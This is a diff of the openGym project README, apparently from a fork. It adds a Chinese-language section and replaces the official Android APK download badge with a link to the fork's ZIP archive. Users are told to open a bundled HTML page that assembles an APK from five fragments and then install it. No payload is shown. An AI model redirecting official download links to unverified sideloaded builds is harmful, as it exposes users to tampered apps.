@@ -1,3 +1,11 @@
+## 简体中文 Android 测试包
+
+[**下载完整 ZIP 安装包**](https://github.com/Coney97/openGym-/archive/7aaae66a4f11259fff3a622d1da4b824204f650b.zip)
+
+解压后，在浏览器打开其中的“生成APK.html”，选中五个分片，校验完成后下载并安装 APK。页面完全离线运行，生成文件与原签名 APK 一致。[查看详细操作说明](artifacts/android/README.zh-CN.md)。
+
+当前为简体中文测试候选，完整汉化和 Android 原生运行验收尚未完成。本中文版仅提供 Android 手机应用。以下保留上游项目介绍；中文版请使用上方下载入口。
+
 <div align="center">
 
 <p>
@@ -16,7 +24,7 @@
 <a href="LICENSE"><img src="https://img.shields.io/badge/license-AGPL--3.0-a3e635?style=flat-square&labelColor=0c0e12&color=a3e635" alt="AGPL-3.0"></a>
 
 <a href="https://apps.apple.com/app/id6822275400"><img src="website/app-store-badge.svg" alt="Download on the App Store" height="40"></a>
-<a href="https://github.com/DuarteSantos8/openGym/releases/latest"><img src="assets/readme/badge-android.svg" alt="Download the Android APK" height="40"></a>
+<a href="https://github.com/Coney97/openGym-/archive/7aaae66a4f11259fff3a622d1da4b824204f650b.zip"><strong>下载简体中文 Android 测试包（ZIP）</strong></a>
 <a href="docs/SELF_HOSTING.md"><img src="assets/readme/badge-selfhost.svg" alt="Self-host with Docker" height="40"></a>
 
 <a href="https://trendshift.io/repositories/88268?utm_source=repository-badge&amp;utm_medium=badge&amp;utm_campaign=badge-repository-88268" target="_blank" rel="noopener noreferrer"><img src="https://trendshift.io/api/badge/repositories/88268" alt="DuarteSantos8%2FopenGym | Trendshift" width="250" height="55"/></a>
